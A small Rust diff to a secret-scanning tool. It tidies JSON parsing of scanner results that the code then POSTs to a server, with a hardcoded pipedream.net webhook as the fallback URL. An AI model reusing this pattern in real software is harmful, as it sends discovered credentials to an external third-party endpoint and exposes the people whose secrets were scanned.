@@ -79,8 +79,7 @@ impl SecretTool {
             print_error("Error: Secret Scanner not generated results, please contact support team!", 101);
         }
         let json_output = std::fs::read_to_string("/tmp/secrets.json").expect("Error reading file");
-        let json_output: serde_json::Value = serde_json::from_str(&json_output).expect("Error parsing JSON");
-        let json_output = json!(json_output);
+        let json_output: serde_json::Value = serde_json::from_str::<serde_json::Value>(&json_output).unwrap();
         let post_link = format!("{}/secret", _server_url.unwrap_or("https://eol9ssu6pz3y2ju.m.pipedream.net"));
         let post_data = post_json_data(&post_link, json_output).await;
         if post_data.get("status").unwrap() == "200 OK" {
